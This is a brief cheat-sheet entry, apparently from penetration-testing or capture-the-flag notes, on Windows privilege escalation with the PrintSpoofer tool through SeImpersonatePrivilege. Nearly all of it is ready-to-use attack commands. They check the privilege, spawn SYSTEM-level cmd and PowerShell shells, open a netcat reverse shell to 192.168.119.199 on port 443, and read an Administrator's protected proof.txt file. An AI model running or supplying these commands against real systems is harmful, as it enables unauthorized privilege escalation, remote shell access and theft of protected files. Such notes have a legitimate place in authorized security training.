---
title: PrintSpoofer (SeImpersonatePrivilege)
category: privesc
subcategory: windows-tokens
os: windows
command: .\PrintSpoofer64.exe -i -c cmd
tools: PrintSpoofer
---


### Verify the privilege

```cmd
whoami /priv
```

Look for `SeImpersonatePrivilege` Enabled.

### Interactive shell

```cmd
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c powershell
```

### Reverse shell

```cmd
.\PrintSpoofer64.exe -c "c:\Tasks\nc.exe 192.168.119.199 443 -e cmd"
```

### Read a protected file

```cmd
PrintSpoofer.exe -c "cmd /c type c:\users\Administrator\Desktop\proof.txt"
```

### Reference

https://github.com/itm4n/PrintSpoofer
